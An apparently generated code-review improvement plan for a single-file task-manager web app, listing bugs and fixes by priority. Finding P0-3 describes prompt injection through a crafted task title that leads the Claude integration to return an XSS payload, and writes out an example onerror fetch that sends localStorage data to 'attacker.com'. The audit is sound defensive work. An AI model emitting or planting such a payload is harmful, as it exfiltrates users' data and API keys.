# Task OS / Givelink — Improvement Plan

_Generated: 2026-05-20 · Codebase: single-file monolith (`index.html` 8 515 lines, `givelink.html`, `sw.js`)_

---

## 🔥 P0 — Ship this week (bugs breaking user flows)

---

### P0-1 · Claude API key leaks in every JSON export

**What:** `S.claudeKey` is stored inside the main state object `S`, which is serialised by `save()` into `localStorage['taskos']` and written verbatim into every `Export Data` backup file.

**Where:** `index.html:6113` (assignment), `index.html:1756` (serialise), `index.html:1764–1768` (export download)

**Why it matters:** A user who shares their backup file (support request, cloud sync, accidental push to a public repo) exposes a live Anthropic API key. Any browser extension or XSS vector that reads `localStorage` gets the key as a side-effect of targeting task data.

**Effort:** S

**Suggested fix:**
- Remove `claudeKey` from `S` entirely; store it separately: `localStorage.setItem('taskos_claude_key', k)`.
- Load it at init outside the `S` spread: `S.claudeKey = localStorage.getItem('taskos_claude_key') || ''`.
- `exportData()` never touches this key — it's structurally impossible to leak it by exporting.

---

### P0-2 · AI fetch has no timeout — buttons permanently lock on slow networks

**What:** `callClaude()` issues `await fetch(...)` with no `AbortController` timeout. If the Anthropic API stalls (common on mobile), the `finally` block in `_aiBtn` never runs, leaving the button disabled and `_aiRunning = true` for the rest of the session.

**Where:** `index.html:3319–3334`

**Why it matters:** On spotty connections the entire AI layer becomes unusable until the user force-refreshes, losing any unsaved task edits open in modals at the time.

**Effort:** S

**Suggested fix:**
- Add `AbortController` at the top of `callClaude()`:
  ```js
  const ctrl = new AbortController();
  const tid = setTimeout(() => ctrl.abort(), 30_000);
  try {
    const res = await fetch(url, { ...opts, signal: ctrl.signal });
    ...
  } finally { clearTimeout(tid); }
  ```
- Catch `AbortError` specifically and show `'Request timed out — try again'` toast instead of the generic error.

---

### P0-3 · AI JSON fields injected into `innerHTML` without escaping (XSS via prompt injection)

**What:** `s.reason` (line 7228), sourced from Claude's parsed JSON response, is interpolated directly into a template literal that is assigned to `innerHTML`. Same pattern occurs wherever AI-returned strings feed `.innerHTML` renders.

**Where:** `index.html:7228` (primary); verify `renderInboxAI`, `applyNotesSynthesis` render paths

**Why it matters:** A crafted task title or note (e.g., pasted from a malicious webpage) that reaches `callClaude()` could return `<img src=x onerror="fetch('https://attacker.com?k='+localStorage.getItem('taskos'))">` and execute in the user's browser, exfiltrating all stored data including the API key.

**Effort:** S

**Suggested fix:**
- Replace `${s.reason}` → `${esc(s.reason)}` at line 7228.
- Grep for every `innerHTML` assignment that contains a variable not wrapped in `esc()` and apply the same fix: `grep -n 'innerHTML.*\${'` returns the full surface.
- The `esc()` helper already exists at line 7238 — it just needs to be used consistently.

---

### P0-4 · Checklist editor and blocker dropdown render user text unescaped

**What:** `_renderChecklistEditor()` embeds `c.text` (user-typed checklist item) and `fillBlockerDrop()` embeds `t.title.slice(0,45)` directly into `innerHTML` string concatenation.

**Where:** `index.html:1720` (`c.text`), `index.html:1734` (`t.title`)

**Why it matters:** A task title containing `</option><option selected>` breaks the blocker dropdown selection silently. Any `<` or `>` in a checklist item visually corrupts the rendered list. These are the most common user-visible rendering bugs in the task editor.

**Effort:** S

**Suggested fix:**
- Line 1720: `'">'+c.text+'</span>'` → `'">'+esc(c.text)+'</span>'`
- Line 1734: `'>'+t.title.slice(0,45)+'</option>'` → `'>'+esc(t.title.slice(0,45))+'</option>'`

---

## ⚡ P1 — High ROI (UX friction blocking conversion)

---

### P1-1 · Default profile name "Panos" is burned into every new-user session

**What:** `let profileName = localStorage.getItem('taskos_name') || 'Panos'` — first-time visitors see "Panos" in the page title, dashboard greeting, and as the implicit persona in AI prompts.

**Where:** `index.html:1710`

**Why it matters:** The first impression is that the app is someone else's personal tool, not a product. Users who share the app link get a broken-looking experience. The hardcoded name also leaks into AI context prompts, causing Claude to address responses to "Panos."

**Effort:** S

**Suggested fix:**
- Change the fallback: `|| ''`.
- In `renderDash()`, if `!profileName`, render a "Welcome! What's your name?" inline prompt instead of the empty greeting.
- Check `!profileName` once at init and open the Settings modal automatically if name is unset.

---

### P1-2 · No onboarding state — new users see a confusing all-zeros dashboard

**What:** `renderDash()` renders stat widgets showing `0 / 0 / 0` and empty habit streaks with no guidance, making the app appear broken on first load.

**Where:** `index.html` — `renderDash()` function (~line 2000 region)

**Why it matters:** No CTA means no activation. Users who land on an empty dashboard have no obvious first action and no signal that the app is working correctly. This is the highest-friction moment in the new-user funnel.

**Effort:** M

**Suggested fix:**
- Add an `if (!S.tasks.length && !S.goals.length)` early return in `renderDash()` that renders a single-column welcome card: app name, one-sentence value prop, and one big "**+ Add your first task**" button wired to `openCapture()`.
- Optionally surface 3 example use-cases as tappable chips that seed a single example task to demonstrate the UI.

---

### P1-3 · `seed()` runs on every page load and can repopulate demo data over real tasks

**What:** `seed()` is called unconditionally at `index.html:6143`. It guards on `S.seededV2` / `S.seededGoalsV3`, but those flags are stored inside `S` — if a user imports a backup exported before those flags were added, or if localStorage is partially cleared, all 100+ demo tasks re-appear on top of real user data.

**Where:** `index.html:6143` (call site), `seed()` function

**Why it matters:** A user who has been maintaining clean task lists for months opens the app after clearing cache and finds their inbox flooded with Panos's personal demo tasks. This has happened in the commit history (multiple seed-version bumps suggest this was a real issue).

**Effort:** S

**Suggested fix:**
- Add a hard guard at the top of `seed()`: `if (S.tasks.length > 0) return;` — never inject demo data if any real tasks exist, regardless of version flags.
- Keep the version flag as a secondary guard for clean installs.

---

### P1-4 · `callClaude()` uses a dated model ID that may be retired

**What:** `model: 'claude-haiku-4-5-20251001'` is hardcoded at line 3325. Model IDs with date suffixes are point-in-time snapshots; as of May 2026, the preferred stable alias is `claude-haiku-4-5`.

**Where:** `index.html:3325`

**Why it matters:** If Anthropic retires the dated snapshot, all AI features return 404 errors with no explanation until the code is updated. The stable alias always resolves to the current best Haiku.

**Effort:** S

**Suggested fix:**
- Define a constant at the top of the script: `const AI_MODEL = 'claude-haiku-4-5';`
- Replace the hardcoded string at line 3325 with `AI_MODEL`.
- This also makes future model upgrades a one-line change.

---

### P1-5 · `importData()` silently overwrites all user data with no confirmation or backup step

**What:** Line 1778 calls `Object.assign(S, d); save(); refresh()` immediately after the file picker confirms — there is no "Are you sure?" gate and no automatic export of the existing data first.

**Where:** `index.html:1778`

**Why it matters:** One wrong file selection permanently destroys months of task history. There is an `undoDelete` for single tasks but nothing for a full overwrite. This is an irreversible, high-blast-radius action with zero friction.

**Effort:** S

**Suggested fix:**
- Replace the direct overwrite with a call to the existing `openConfirm()` modal: _"This will replace ALL your current data (N tasks, M goals). Would you like to export a backup first?"_
- Offer three buttons: **Export first**, **Replace anyway**, **Cancel**.
- Trigger `exportData()` automatically before the replace when the user chooses "Export first."

---

## 🛠 P2 — Code health (tech debt slowing velocity)

---

### P2-1 · 8 515-line monolithic HTML file makes every change a merge-conflict risk

**What:** All CSS (lines 14–372), all HTML structure (lines 375–1700), and ~7 000 lines of JavaScript live in a single `index.html` with no modules, no build system, and no file-level separation of concerns.

**Where:** `index.html:1–8515`

**Why it matters:** Every PR touches the same file. `grep` is the only navigation tool. Dead code is invisible. A single typo in the 6 000-line JS block breaks the entire application. Onboarding any contributor takes a full day of orientation.

**Effort:** L

**Suggested fix:**
- As a first, non-breaking step: extract `<style>` into `styles.css` and `<script>` into `app.js`; update `index.html` with `<link>` and `<script src="app.js">`. No bundler needed.
- In a second pass, split `app.js` into 4–5 logical ES modules (`data.js`, `views.js`, `ai.js`, `utils.js`) using native `<script type="module">`.
- Do not rewrite logic — just move existing code into files.

---

### P2-2 · Five empty `catch` blocks silently mask errors in notifications and data parsing

**What:** `catch(e){}` / `catch(_){}` at lines 6753, 6775, 6797, 6898, and 7126 swallow all errors with no logging or user feedback.

**Where:** `index.html:6753`, `6775`, `6797`, `6898`, `7126`

**Why it matters:** When ntfy.sh push notifications fail to send, users assume reminders are working when they aren't. When JSON parsing fails at line 6898/7126, the AI feature silently returns nothing. Both categories produce phantom failures that are impossible to debug without source diving.

**Effort:** S

**Suggested fix:**
- Lines 6753, 6775, 6797: `catch(e){ console.warn('[notifications] failed:', e); }` — these are fire-and-forget network calls where a toast would be too noisy, but a console warning is essential.
- Lines 6898, 7126: `catch(e){ console.warn('[AI parse] invalid JSON from model:', e); }` and surface a toast: `'AI returned unparseable response — try again'`.

---

### P2-3 · Service Worker registration has no `.catch()` — update banner silently never fires

**What:** `navigator.serviceWorker.register('./sw.js').then(reg => { ... })` at line 6148 omits a `.catch()` handler.

**Where:** `index.html:6148–6155`

**Why it matters:** In Firefox Private Browsing, some corporate Chrome policies, and any HTTPS-misconfigured environment, SW registration fails silently. The `updatefound` listener never attaches, the update banner never shows, and users run stale cached versions indefinitely without knowing.

**Effort:** S

**Suggested fix:**
- Append `.catch(err => console.warn('[SW] registration failed, updates disabled:', err))`.
- Optionally surface a non-intrusive toast on repeated failures: `'App updates may be delayed — SW unavailable'`.

---

### P2-4 · Givelink sprint board uses blue as primary accent instead of brand purple

**What:** `givelink.html:17` defines `--accent: #3b82f6` (Tailwind blue-500). The Givelink brand palette specifies purple `#5718CA` as the primary accent. The pink priority indicator `--pr: #f472b6` is used in contexts that may render over the blue accent, which does not violate the no-pink-on-purple rule but does violate brand consistency.

**Where:** `givelink.html:17` (`--accent`), `givelink.html:18` (`--pr`)

**Why it matters:** The sprint board looks like a generic blue Jira clone, not a Givelink-branded tool. Anyone switching between the sprint board and any future Givelink product will feel a brand discontinuity.

**Effort:** S

**Suggested fix:**
- Change `--accent: #3b82f6` → `--accent: #5718CA` in `givelink.html:17`.
- Verify that `--pr` (pink) is only used as a text label on dark neutral backgrounds (`--bg: #070d1a`), never as text on a purple surface — this satisfies the no-pink-on-purple rule.
- Update `meta[name="theme-color"]` at `givelink.html:6` from `#3b82f6` → `#5718CA`.

---

### P2-5 · `uid()` can produce collisions during AI batch task imports

**What:** `uid()` returns `Date.now().toString(36) + Math.random().toString(36).slice(2)`. When `applyNotesSynthesis()` adds 3–8 tasks in a synchronous loop (line 6937), all calls in the same millisecond share an identical `Date.now()` prefix; the `Math.random()` suffix is the only differentiator.

**Where:** `index.html:1814` (`uid()`), `index.html:6937` (batch caller)

**Why it matters:** Duplicate task IDs cause silent corruption: `softDelete`, `openEdit`, and `blockedBy` lookups all use `.find(x => x.id === id)` — a collision means one task is silently unreachable and another is permanently deleted when the wrong item is targeted.

**Effort:** S

**Suggested fix:**
- Add a module-level counter: `let _uidSeq = 0;`
- Update `uid()`: `return Date.now().toString(36) + (++_uidSeq).toString(36) + Math.random().toString(36).slice(2);`
- This guarantees uniqueness within a session regardless of clock resolution.

---

## 💡 P3 — Nice to have

---

### P3-1 · No keyboard shortcut help overlay — power features are completely undiscoverable

**What:** The app registers `Cmd+K` (global search), `Cmd+2` (Givelink), and several in-view shortcuts, but there is no modal, tooltip, or footer hint that reveals them.

**Where:** `index.html:6131–6134` (keyboard handler)

**Why it matters:** Keyboard shortcuts are the fastest path to daily retention for power users. If they don't know the shortcuts exist, they mouse through every action and perceive the app as slower than it is.

**Effort:** S

**Suggested fix:**
- Add a `?` or `Cmd+/` handler that opens a small modal listing all registered shortcuts, grouped by context (Global / Tasks / AI).
- Add a `⌘K` hint badge to the search icon in the sidebar.

---

### P3-2 · Notification permission request has no `.catch()` — denied state is never handled

**What:** `Notification.requestPermission().then(() => openReminderSettings())` at line 6817 has no rejection handler. In Firefox, `requestPermission()` can reject (unlike Chrome where it always resolves).

**Where:** `index.html:6817`

**Why it matters:** Firefox users who deny the notification prompt get an unhandled promise rejection in the console and the reminder settings modal may fail to re-render correctly, leaving the UI in a partially updated state.

**Effort:** S

**Suggested fix:**
- Change to `.then(() => openReminderSettings()).catch(() => openReminderSettings())` — always re-render settings regardless of outcome; the `perm` variable inside `openReminderSettings()` reads the live `Notification.permission` state so it will show the correct "Blocked" status.

---

### P3-3 · Direct browser-to-Anthropic API calls expose the key in DevTools network panel

**What:** `callClaude()` uses `anthropic-dangerous-direct-browser-access: true` (line 3324), which is Anthropic's own signal that this pattern is a known security trade-off. The API key is visible in plain text in the browser's Network tab.

**Where:** `index.html:3322–3325`

**Why it matters:** Low risk for a single-user personal app on a trusted device. Becomes material if: (a) the app moves to a hosted multi-user model, (b) a malicious browser extension intercepts requests, or (c) a user demos the app on a shared machine.

**Effort:** L (requires a thin backend)

**Suggested fix:**
- For single-user / self-hosted: current approach is acceptable; document the risk in README.
- If moving toward a hosted product: add a single Vercel Edge Function (`/api/ai`) that holds a server-side key; the client POSTs the prompt and receives the response — the API key never leaves the server.
- As an interim step, at minimum warn the user in the Settings UI: _"Your API key is stored locally and sent directly to Anthropic from your browser."_
